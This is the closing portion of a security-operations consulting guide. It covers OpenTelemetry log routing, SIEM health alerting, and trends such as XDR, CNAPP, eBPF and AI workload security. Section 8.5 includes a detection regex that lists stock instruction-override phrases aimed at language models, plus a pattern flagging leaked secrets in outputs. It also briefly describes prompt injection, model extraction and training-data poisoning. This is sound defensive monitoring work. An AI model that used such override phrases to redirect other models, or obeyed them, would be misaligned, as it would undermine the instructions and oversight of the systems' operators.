          routing/cost:
            default_exporters: [elasticsearch/warm]
            table:
              # High-value: alerts, auth failures, admin actions -> hot SIEM
              - statement: route()
                condition: 'attributes["security.event_type"] in ["alert", "authentication_failure", "privilege_escalation", "policy_violation"]'
                exporters: [splunkhec/hot]

              # Medium-value: successful auth, network connections -> warm
              - statement: route()
                condition: 'attributes["security.event_type"] in ["authentication_success", "network_connection"]'
                exporters: [elasticsearch/warm]

              # Low-value: health checks, routine scans -> cold only
              - statement: route()
                condition: 'attributes["security.event_type"] in ["health_check", "scheduled_scan", "dns_query"]'
                exporters: [awss3/cold]

    data_reduction:
      description: "Reduce data volume while preserving security value"
      techniques:
        - name: "DNS log summarization"
          before: "Every DNS query = ~500 bytes * millions/day"
          after: "Summarize to unique (source, domain, query_type, count) per 5-min window"
          savings: "80-95%"
          risk: "Lose exact timing of individual queries"

        - name: "NetFlow instead of full PCAP"
          before: "Full packet capture = 100+ GB/day per Gbps link"
          after: "NetFlow/IPFIX = ~1-5% of PCAP volume"
          savings: "95-99%"
          risk: "Lose payload content (but preserve connection metadata)"

        - name: "Log field extraction vs. raw"
          before: "Store full raw log + indexed fields"
          after: "Store only extracted fields for routine queries, raw for cold"
          savings: "30-50%"

    cost_comparison:
      # Typical cost per GB/month for security data storage (2024-2025)
      splunk_cloud: "$15-25/GB ingested/day (includes 90d retention)"
      elastic_cloud: "$3-8/GB stored/month (hot tier)"
      sentinel: "$2.76/GB ingested"
      chronicle: "Fixed pricing (usually lower per GB at scale)"
      s3_standard: "$0.023/GB/month"
      s3_glacier: "$0.004/GB/month"
      s3_deep_archive: "$0.00099/GB/month"

  capacity_planning: |
    # Security data capacity planning formula
    capacity_planning:
      inputs:
        endpoints: 5000
        servers: 500
        cloud_accounts: 10
        network_bandwidth_gbps: 10
        users: 3000

      daily_volume_estimates:
        endpoint_logs: "5000 * 50 MB/day = 250 GB/day"
        server_logs: "500 * 200 MB/day = 100 GB/day"
        firewall_logs: "10 Gbps * 0.5% logging = ~50 GB/day"
        cloud_audit: "10 accounts * 5 GB/day = 50 GB/day"
        dns_logs: "3000 users * 10 MB/day = 30 GB/day"
        auth_logs: "3000 users * 5 MB/day = 15 GB/day"
        application_logs: "~100 GB/day"
        total_daily: "~595 GB/day"

      annual_storage:
        hot_30d: "595 * 30 * 1.5 = ~27 TB"
        warm_90d: "595 * 60 * 1.2 = ~43 TB"
        cold_1yr: "595 * 275 * 1.0 = ~164 TB"
        archive_7yr: "595 * 365 * 6 * 0.3 = ~391 TB (compressed)"
        total_managed: "~625 TB"
```

### 7.5 Monitoring the Monitors

```yaml
monitoring_the_monitors:
  overview: |
    The security observability infrastructure itself must be monitored. If the
    SIEM goes down, log collection stops, or the OTel pipeline drops data,
    the organization is blind to attacks during that window.

  critical_health_metrics:
    otel_collector_health:
      metrics:
        - "otelcol_receiver_accepted_log_records"
        - "otelcol_receiver_refused_log_records"
        - "otelcol_exporter_sent_log_records"
        - "otelcol_exporter_send_failed_log_records"
        - "otelcol_processor_dropped_log_records"
        - "otelcol_exporter_queue_size"
        - "otelcol_exporter_queue_capacity"
      alerts: |
        # Alert on OTel Collector pipeline issues
        groups:
          - name: otel_security_pipeline
            rules:
              - alert: SecurityPipelineDropping
                expr: |
                  rate(otelcol_processor_dropped_log_records{pipeline="logs/security"}[5m]) > 0
                for: 2m
                labels: { severity: critical }
                annotations:
                  summary: "Security log pipeline dropping records"

              - alert: SecurityPipelineBackpressure
                expr: |
                  otelcol_exporter_queue_size{pipeline="logs/security"}
                  / otelcol_exporter_queue_capacity{pipeline="logs/security"} > 0.8
                for: 5m
                labels: { severity: warning }
                annotations:
                  summary: "Security pipeline queue > 80% full"

              - alert: SecurityLogIngestionStopped
                expr: |
                  rate(otelcol_receiver_accepted_log_records{pipeline="logs/security"}[5m]) == 0
                for: 5m
                labels: { severity: critical }
                annotations:
                  summary: "No security logs received for 5 minutes"

    siem_health:
      metrics:
        - "siem_ingestion_rate_bytes_per_second"
        - "siem_search_latency_seconds"
        - "siem_alert_delivery_latency_seconds"
        - "siem_index_size_bytes"
        - "siem_license_usage_percentage"
      alerts: |
        - alert: SIEMIngestionDrop
          expr: |
            rate(siem_ingestion_rate_bytes_per_second[5m])
            < 0.5 * avg_over_time(siem_ingestion_rate_bytes_per_second[24h])
          for: 10m
          labels: { severity: critical }
          annotations:
            summary: "SIEM ingestion rate dropped > 50% from 24h average"

        - alert: SIEMLicenseNearLimit
          expr: siem_license_usage_percentage > 85
          for: 1h
          labels: { severity: warning }
          annotations:
            summary: "SIEM license usage at {{ $value }}%"

    log_source_health:
      description: "Detect when expected log sources stop sending"
      implementation: |
        # Track expected log sources and alert on missing
        expected_log_sources:
          - source: "domain_controllers"
            index: "windows"
            expected_hosts: 4
            min_events_per_hour: 1000

          - source: "firewalls"
            index: "firewall"
            expected_hosts: 2
            min_events_per_hour: 10000

          - source: "cloud_trail"
            index: "cloudtrail"
            expected_accounts: 10
            min_events_per_hour: 500

        # Splunk: Detect missing log sources
        dead_source_query: |
          | tstats count where index=* by host, index, sourcetype span=1h
          | eventstats avg(count) as avg_count by host, index, sourcetype
          | where count < avg_count * 0.1 OR count == 0
          | eval status="MISSING_LOGS"

  security_of_security_infrastructure:
    hardening:
      - "SIEM on dedicated, hardened infrastructure (not accessible to general IT)"
      - "OTel Collector service accounts with minimal privileges"
      - "Encrypted transport for all telemetry data (mTLS between components)"
      - "Log data encrypted at rest"
      - "Access to security platforms requires MFA + privileged access management"
      - "Security platform changes require approval and are audit-logged"
    monitoring:
      - "Monitor access to SIEM/SOAR/OTel management interfaces"
      - "Alert on security tool configuration changes"
      - "Alert on security tool process/service restarts"
      - "Monitor security tool update/patch status"
    anti_tampering:
      - "Separate the security monitoring infrastructure from what it monitors"
      - "Use immutable infrastructure (containers, read-only file systems)"
      - "Forward security tool logs to an independent secondary system"
      - "Implement dead-man switches (alert if monitoring stops)"
```

---

## 8. Emerging Trends

### 8.1 AI/ML for Security Detection and Investigation

```yaml
ai_ml_security:
  current_state_2025:
    description: |
      AI/ML in security has matured from experimental to operational in several areas,
      while remaining overhyped in others. The key distinction is between ML that
      augments analysts (force multiplier) vs. ML that replaces analysts (not yet viable).

  proven_use_cases:
    ueba:
      description: "User and Entity Behavior Analytics"
      maturity: "Production-ready"
      how_it_works: |
        1. Build baseline behavior profile per user/entity over 30-90 days
        2. Score deviations from baseline (anomaly score)
        3. Combine anomaly scores across dimensions for risk scoring
        4. Alert when composite risk exceeds threshold
      capabilities:
        - "Detect compromised accounts (behavior change after credential theft)"
        - "Detect insider threats (data hoarding, off-hours access)"
        - "Detect lateral movement (new access patterns)"
      platforms: ["Splunk UBA", "Microsoft Sentinel UEBA", "Exabeam", "Securonix", "Gurucul"]
      limitations:
        - "30-90 day baselining period (blind during ramp-up)"
        - "High false positive rate during organizational changes"
        - "Requires clean identity data (user-to-account mapping)"

    malware_classification:
      description: "ML models for malware detection and classification"
      maturity: "Production-ready"
      techniques:
        - "Static analysis: PE header features, byte n-grams, string analysis"
        - "Dynamic analysis: API call sequences, behavioral patterns"
        - "Deep learning: CNN/RNN on raw binary data"
      platforms: ["CrowdStrike Falcon", "SentinelOne Singularity", "Carbon Black", "Cylance"]

    nlp_for_threat_intel:
      description: "NLP to process threat intelligence reports automatically"
      maturity: "Emerging"
      capabilities:
        - "Extract IoCs (IPs, domains, hashes) from unstructured reports"
        - "Map threat reports to MITRE ATT&CK techniques"
        - "Summarize threat briefings for SOC consumption"
        - "Translate detection logic from natural language to queries"

    llm_augmented_soc:
      description: "Large Language Models assisting SOC analysts"
      maturity: "Early production (2024-2025)"
      use_cases:
        - name: "Alert summarization"
          description: "LLM summarizes related alerts into human-readable incident narrative"
          value: "Reduces L1 triage time by 50-70%"

        - name: "Query generation"
          description: "Analyst describes what to find in natural language; LLM generates SIEM query"
          value: "Enables L1 analysts to run L2-level queries"
          example: |
            Analyst: "Show me all failed login attempts from outside the US for user jdoe
                      in the last 24 hours"
            LLM generates:
              index=auth action=login status=failure user="jdoe" earliest=-24h
              | iplocation src_ip
              | where Country != "United States"
              | table _time, src_ip, Country, City, user, status

        - name: "Playbook recommendation"
          description: "LLM suggests investigation steps based on alert context"
          value: "Standardizes L1 investigation quality"

        - name: "Incident report drafting"
          description: "LLM drafts incident report from investigation timeline and findings"
          value: "Reduces documentation time by 60-80%"

      platforms:
        - "Microsoft Security Copilot (Sentinel + Defender)"
        - "Google Chronicle AI"
        - "CrowdStrike Charlotte AI"
        - "Splunk AI Assistant"
        - "SentinelOne Purple AI"

      risks:
        - "Hallucination: LLM may generate plausible but incorrect investigation leads"
        - "Prompt injection: Malicious log content could manipulate LLM responses"
        - "Data leakage: Sensitive data in prompts sent to external LLM APIs"
        - "Over-reliance: Analysts trusting LLM output without verification"

  detection_engineering_with_ml:
    anomaly_detection_pipeline: |
      +------------------------------------------------------------------+
      | ML-Augmented Detection Pipeline                                   |
      +------------------------------------------------------------------+
      |                                                                    |
      | Raw Telemetry -> Feature Extraction -> ML Models -> Risk Scoring  |
      |                                                                    |
      | Features:                    Models:           Output:            |
      | - Login time entropy         - Isolation       - Anomaly score    |
      | - Geo-velocity               Forest           per entity         |
      | - Resource access diversity  - DBSCAN          - Contributing     |
      | - Session duration pattern   - Autoencoder       features        |
      | - API call frequency         - LSTM            - Recommended     |
      | - Data transfer volume       - XGBoost           action          |
      |                              (supervised)                        |
      +------------------------------------------------------------------+
      |                                                                    |
      | Feedback Loop:                                                    |
      | Analyst disposition (TP/FP) -> Retrain supervised models          |
      | Quarterly model evaluation -> Precision/Recall/F1 tracking       |
      +------------------------------------------------------------------+
```

### 8.2 XDR (Extended Detection and Response)

```yaml
xdr:
  definition: |
    XDR unifies detection and response across endpoint, network, cloud, email,
    and identity into a single platform with centralized correlation and response.
    Unlike traditional SIEM (which aggregates logs from separate tools), XDR
    natively integrates telemetry from multiple security domains.

  architecture: |
    +------------------------------------------------------------------+
    | XDR Architecture                                                   |
    +------------------------------------------------------------------+
    |                                                                    |
    | Data Sources (Native Integration)                                 |
    | +------+  +------+  +------+  +------+  +------+  +------+      |
    | | EDR  |  | NDR  |  | Email|  | Cloud|  | IdP  |  | App  |      |
    | |      |  |      |  | Sec  |  | Sec  |  |      |  | Sec  |      |
    | +--+---+  +--+---+  +--+---+  +--+---+  +--+---+  +--+---+      |
    |    |         |         |         |         |         |            |
    |    v         v         v         v         v         v            |
    | +----------------------------------------------------------+     |
    | |              Unified Data Lake + Correlation Engine        |     |
    | |                                                            |     |
    | | - Cross-domain correlation (endpoint + network + identity) |     |
    | | - Automated attack chain reconstruction                    |     |
    | | - ML-driven detection across all domains                   |     |
    | +----------------------------------------------------------+     |
    | |              Unified Response Orchestration                 |     |
    | | - Isolate endpoint + block IP + disable account in one action|   |
    | +----------------------------------------------------------+     |
    +------------------------------------------------------------------+

  market_landscape_2025:
    native_xdr:  # Single-vendor, tightly integrated
      - name: "Microsoft Defender XDR"
        components: "Defender for Endpoint + Identity + Cloud + O365 + Sentinel"
      - name: "CrowdStrike Falcon XDR"
        components: "Falcon Insight (EDR) + Falcon Identity + Falcon Cloud"
      - name: "Palo Alto Cortex XDR"
        components: "Cortex XDR + Prisma Cloud + XSOAR"
      - name: "Trend Micro Vision One"
        components: "Endpoint + Network + Email + Cloud"
      - name: "SentinelOne Singularity"
        components: "Endpoint + Cloud + Identity + Data"

    open_xdr:  # Multi-vendor, API-integrated
      - name: "Stellar Cyber"
      - name: "Hunters.AI"
      - name: "ReliaQuest GreyMatter"

  xdr_vs_siem:
    | Dimension | SIEM | XDR |
    |-----------|------|-----|
    | Data model | Log-centric (any log source) | Telemetry-centric (structured security data) |
    | Integration | API + parsers (broad, shallow) | Native agents (deep, narrower scope) |
    | Detection | Correlation rules + analytics | Cross-domain ML + rules |
    | Investigation | Query-based | Guided investigation + auto-enrichment |
    | Response | SOAR integration required | Built-in response actions |
    | Compliance | Strong (log retention, audit) | Weaker (focused on detection) |
    | Customization | Highly customizable | More opinionated/prescriptive |
    | Best for | Compliance + broad log aggregation | Threat detection + response speed |

  otel_and_xdr: |
    OTel complements XDR by providing application-layer security telemetry that
    XDR platforms typically lack. XDR excels at endpoint, network, and identity
    but often has limited visibility into application behavior:

    - OTel traces: Show attack paths through application microservices
    - OTel logs: Application security events (auth failures, RBAC violations)
    - OTel metrics: Application anomaly detection (request patterns, error rates)

    Integration pattern: OTel Collector -> XDR platform data lake (via API or OTLP)
```

### 8.3 CNAPP (Cloud-Native Application Protection Platform)

```yaml
cnapp:
  definition: |
    CNAPP converges Cloud Security Posture Management (CSPM), Cloud Workload
    Protection Platform (CWPP), Cloud Infrastructure Entitlement Management (CIEM),
    and additional cloud security capabilities into a unified platform.

  components: |
    +------------------------------------------------------------------+
    | CNAPP Components                                                   |
    +------------------------------------------------------------------+
    |                                                                    |
    | +-------------------+  +-------------------+  +-----------------+ |
    | | CSPM              |  | CWPP              |  | CIEM            | |
    | | Cloud Security    |  | Cloud Workload    |  | Cloud Infra     | |
    | | Posture Mgmt      |  | Protection        |  | Entitlement     | |
    | |                   |  |                   |  | Management      | |
    | | - Misconfiguration|  | - Runtime protect |  | - Excessive     | |
    | |   detection       |  | - Vulnerability   |  |   permissions   | |
    | | - Compliance       |  |   scanning       |  | - Least         | |
    | |   benchmarks      |  | - Container sec   |  |   privilege     | |
    | | - Drift detection  |  | - Serverless sec  |  |   enforcement   | |
    | +-------------------+  +-------------------+  +-----------------+ |
    |                                                                    |
    | +-------------------+  +-------------------+  +-----------------+ |
    | | IaC Scanning      |  | KSPM              |  | API Security    | |
    | | - Terraform       |  | Kubernetes Sec    |  | - Discovery     | |
    | | - CloudFormation  |  | Posture Mgmt      |  | - Risk scoring  | |
    | | - Pulumi          |  | - CIS Benchmarks  |  | - Runtime       | |
    | +-------------------+  +-------------------+  +-----------------+ |
    +------------------------------------------------------------------+

  market_leaders_2025:
    - name: "Wiz"
      strengths: "Agentless cloud scanning, attack path analysis, DSPM"
    - name: "Palo Alto Prisma Cloud"
      strengths: "Broadest feature set, code-to-cloud coverage"
    - name: "Orca Security"
      strengths: "SideScanning technology, agentless"
    - name: "CrowdStrike Cloud Security"
      strengths: "Agent-based runtime protection, unified with endpoint"
    - name: "Microsoft Defender for Cloud"
      strengths: "Native Azure integration, multi-cloud support"
    - name: "Aqua Security"
      strengths: "Container + Kubernetes focus, open source roots"
    - name: "Lacework"
      strengths: "Polygraph anomaly detection, behavioral analytics"
    - name: "Sysdig"
      strengths: "Runtime + Falco integration, Kubernetes-native"

  cnapp_observability_integration: |
    CNAPP findings should flow into the security observability pipeline:

    CNAPP Platform  ->  Webhook/API  ->  OTel Collector  ->  SIEM
    (findings)         (events)          (normalize)         (correlate)

    Key integration points:
    - CSPM misconfigurations: Correlate with actual exploitation attempts
    - CWPP runtime alerts: Enrich with application context from OTel traces
    - CIEM excessive permissions: Correlate with actual permission usage from CloudTrail
    - Attack path findings: Validate with real network flow data
```

### 8.4 eBPF for Security

```yaml
ebpf_security:
  overview: |
    eBPF has become the foundation of next-generation security monitoring,
    providing kernel-level visibility without kernel modules or code changes.

  security_platforms_using_ebpf:
    cilium_tetragon:
      description: "Kubernetes-aware security observability and runtime enforcement"
      capabilities:
        - "Process execution monitoring"
        - "Network policy enforcement"
        - "File access monitoring"
        - "Privilege escalation detection"
        - "Container escape detection"
      enforcement: "Can kill processes and deny network connections in real-time"

    falco:
      description: "Cloud-native runtime security (now with eBPF driver)"
      capabilities:
        - "System call monitoring"
        - "Container runtime detection"
        - "Kubernetes audit log processing"
        - "Rule-based detection engine"

    tracee_aqua:
      description: "eBPF-based runtime security from Aqua"
      capabilities:
        - "Runtime detection with Rego policies"
        - "SBOM generation from runtime"
        - "Container forensics"

    datadog_cws:
      description: "Datadog Cloud Workload Security"
      capabilities:
        - "eBPF-based file + process + network monitoring"
        - "Integrated with Datadog APM and logs"

  ebpf_vs_traditional: |
    | Aspect | Traditional Agent (kernel module) | eBPF |
    |--------|-----------------------------------|------|
    | Kernel access | Requires kernel module loading | Runs in eBPF VM (verified, sandboxed) |
    | Safety | Can crash kernel | Cannot crash kernel (verifier enforced) |
    | Performance | Variable (depends on implementation) | Optimized by JIT compiler |
    | Deployment | Kernel version dependent, reboot needed | No reboot, dynamic loading |
    | Evasion | Can be unloaded by rootkit | Harder to evade (kernel-level) |
    | Kubernetes | Separate DaemonSet | Native Kubernetes integration |
    | Overhead | 1-5% CPU typically | < 1% CPU typically |

  otel_ebpf_integration:
    description: "eBPF security events flowing into OTel pipeline"
    architecture: |
      # Tetragon -> JSON log -> OTel filelog receiver -> SIEM
      # Falco -> gRPC output -> OTel OTLP receiver -> SIEM (via Falco OTLP plugin)
      # Both tools increasingly support OTLP export natively

      receivers:
        otlp:
          protocols:
            grpc: { endpoint: 0.0.0.0:4317 }

        filelog/tetragon:
          include: [/var/run/cilium/tetragon/tetragon.log]
          operators:
            - type: json_parser

      processors:
        transform/ebpf_enrich:
          log_statements:
            - context: log
              statements:
                - set(attributes["security.source"], "ebpf")
                - set(attributes["security.tool"], "tetragon")
```

### 8.5 Security Observability for AI/ML Workloads

```yaml
ai_ml_workload_security:
  overview: |
    As organizations deploy AI/ML systems, new security observability challenges emerge:
    model theft, training data poisoning, adversarial inputs, prompt injection, and
    AI supply chain attacks.

  threat_categories:
    model_theft:
      description: "Stealing trained models via API queries (model extraction attacks)"
      detection:
        - "Monitor API call volume per user/key (unusually high = extraction attempt)"
        - "Track prediction confidence distribution (extraction queries tend to probe boundaries)"
        - "Monitor for systematic input patterns (grid searches, adversarial queries)"
      query: |
        index=ml_api
        | stats count dc(input_hash) as unique_inputs
                avg(confidence_score) as avg_confidence
          by api_key, model_name, span=1h
        | where unique_inputs > 10000 OR avg_confidence < 0.3

    training_data_poisoning:
      description: "Injecting malicious data into training pipelines"
      detection:
        - "Monitor training data source integrity (hash verification)"
        - "Track model performance drift after retraining"
        - "Detect anomalous data contributions in federated learning"
      metrics:
        - "model_accuracy_drift{model, dataset}"
        - "training_data_integrity_check{status, pipeline}"
        - "data_contribution_anomaly_score{contributor}"

    prompt_injection:
      description: "Manipulating LLM behavior through crafted inputs"
      detection:
        - "Monitor for known prompt injection patterns in inputs"
        - "Track output deviation from expected behavior"
        - "Monitor for data exfiltration attempts via model outputs"
      otel_implementation: |
        # OTel instrumentation for LLM security monitoring
        # (Emerging: OTel GenAI semantic conventions)
        processors:
          transform/llm_security:
            log_statements:
              - context: log
                conditions:
                  - 'attributes["gen_ai.system"] != nil'
                statements:
                  # Flag potential prompt injection patterns
                  - set(attributes["security.llm_risk"], "prompt_injection")
                    where IsMatch(attributes["gen_ai.prompt"], "(?i)(ignore previous|system prompt|you are now|forget your instructions)")

                  # Flag potential data exfiltration via output
                  - set(attributes["security.llm_risk"], "data_exfiltration")
                    where IsMatch(attributes["gen_ai.completion"], "(SSN|credit card|password|API key|secret)")

    adversarial_inputs:
      description: "Inputs designed to cause misclassification"
      detection:
        - "Monitor input feature distributions for anomalies"
        - "Track confidence score distributions (adversarial inputs often cluster near boundaries)"
        - "Detect high-entropy or unusual input patterns"

  ai_supply_chain:
    risks:
      - "Malicious pre-trained models (model trojan/backdoor)"
      - "Compromised model registries (Hugging Face, model zoos)"
      - "Poisoned training datasets"
      - "Vulnerable ML frameworks (PyTorch, TensorFlow, ONNX Runtime)"
    monitoring:
      - "Model provenance tracking (who trained it, on what data, where)"
      - "Model signing and verification (similar to code signing)"
      - "SBOM for ML: track framework versions, dataset versions"
      - "Vulnerability scanning of ML infrastructure"
```

### 8.6 Attack Surface Management (ASM)

```yaml
attack_surface_management:
  definition: |
    Attack Surface Management (ASM) continuously discovers, classifies, and
    monitors all externally-facing assets (known and unknown) to identify
    and reduce the organization's attack surface.

  asm_components:
    discovery:
      - "Domain enumeration (DNS records, subdomains, certificate transparency)"
      - "IP range scanning (port scanning, service fingerprinting)"
      - "Cloud asset discovery (S3 buckets, Azure blobs, GCS buckets)"
      - "SaaS application inventory"
      - "API endpoint discovery"
      - "Code repository scanning (leaked credentials, exposed configs)"
    classification:
      - "Asset ownership attribution"
      - "Technology fingerprinting (web frameworks, CMS, server versions)"
      - "Data sensitivity classification"
      - "Business criticality scoring"
    monitoring:
      - "New asset detection (shadow IT, unauthorized deployments)"
      - "Configuration change detection"
      - "Vulnerability detection on discovered assets"
      - "Certificate expiration monitoring"
      - "Exposed credential monitoring (dark web, paste sites)"

  asm_observability_integration: |
    ASM findings should enrich the security observability pipeline:

    +------------------------------------------------------------------+
    | ASM + Security Observability Integration                          |
    +------------------------------------------------------------------+
    |                                                                    |
    | ASM Platform                                                      |
    | (Mandiant ASM, CrowdStrike Falcon Surface,                       |
    |  Censys, Shodan, Randori, Halo Security)                         |
    |                        |                                          |
    |            API / Webhook                                          |
    |                        v                                          |
    | +----------------------------------------------------------+     |
    | | Security Observability Pipeline (OTel Collector)           |     |
    | |                                                            |     |
    | | Enrich security events with ASM context:                   |     |
    | | - "Is the target IP/domain in our known attack surface?"   |     |
    | | - "What technology runs on this asset?"                    |     |
    | | - "What is the asset's risk score?"                        |     |
    | | - "Are there known vulnerabilities on this asset?"         |     |
    | +----------------------------------------------------------+     |
    |                        |                                          |
    |                        v                                          |
    | SIEM: Correlate external attack surface with internal detections  |
    | Example: Alert if inbound attack targets a known-vulnerable       |
    |          external asset (ASM risk + SIEM detection)               |
    +------------------------------------------------------------------+

  asm_metrics:
    - "attack_surface_assets_total{type, criticality, status}"
    - "attack_surface_new_assets_total{type, source}"
    - "attack_surface_vulnerabilities_total{severity, asset_type}"
    - "attack_surface_exposed_services_total{port, service}"
    - "attack_surface_expiring_certificates_total{days_remaining_bucket}"
    - "attack_surface_shadow_it_total{type}"
    - "attack_surface_mean_time_to_inventory_hours"
```

---

## Consulting Engagement Guidance

### When to Recommend Each Capability

| Client Maturity | Recommended Focus Areas | Quick Wins | Long-Term Investments |
|----------------|------------------------|------------|----------------------|
| **Level 0-1** (No/Basic SOC) | Centralized logging, basic SIEM, alert triage playbooks | OTel Collector for log aggregation, PCI/HIPAA compliance dashboards | SIEM deployment, L1/L2 staffing |
| **Level 2** (Reactive SOC) | Alert fatigue reduction, SOC KPIs, compliance automation | Risk-based alerting, auto-close playbooks, detection-as-code CI/CD | SOAR deployment, threat hunting program |
| **Level 3** (Proactive SOC) | Threat hunting, purple team, ATT&CK coverage optimization | ML-augmented detection, MITRE coverage heat maps, PIR process | XDR evaluation, CNAPP deployment |
| **Level 4+** (Optimized SOC) | AI-augmented SOC, attack surface management, security data lake | LLM copilot deployment, eBPF runtime security, OCSF schema | Autonomous response, predictive security |

### Key Differentiators for OTel-Based Security Consulting

```yaml
consulting_value_propositions:
  unified_pipeline:
    pitch: "Replace 5+ log shippers with one OTel Collector fleet"
    value: "Reduced operational complexity, vendor-neutral, single config language"
    proof_points:
      - "OTel Collector can receive syslog, filelog, OTLP, Kafka, S3 in one deployment"
      - "Route to multiple destinations (SIEM + archive + streaming) simultaneously"
      - "Built-in PII redaction before data leaves the collection tier"

  compliance_automation:
    pitch: "Automated compliance evidence collection mapped to PCI/HIPAA/SOC2/NIST"
    value: "80% reduction in audit preparation time, continuous compliance posture"
    proof_points:
      - "Single evidence query maps to 5+ compliance frameworks"
      - "Automated monthly evidence packages"
      - "Real-time compliance dashboard"

  cost_optimization:
    pitch: "70% security data cost reduction through intelligent routing"
    value: "Route security data by value: high-value to SIEM, medium to warm, low to cold"
    proof_points:
      - "OTel routing processor separates hot/warm/cold at collection time"
      - "Typical enterprise: 40% of security logs are low-value (health checks, DNS noise)"
      - "Cold storage at $0.023/GB vs. SIEM at $15/GB = 650x cost difference"

  application_security_visibility:
    pitch: "Bridge the gap between SecOps and AppSec with OTel traces"
    value: "See attack paths through application microservices, not just at the perimeter"
    proof_points:
      - "Distributed trace shows SQL injection from ingress to database"
      - "OTel spans capture authentication failures with full context"
      - "Application security events (OWASP) detectable in trace data"
```

---

*This document serves as a comprehensive consulting knowledge base for security operations, compliance monitoring, and OpenTelemetry security integration. It provides specific technical details, configurations, queries, and architecture patterns suitable for enterprise consulting engagements at all maturity levels.*
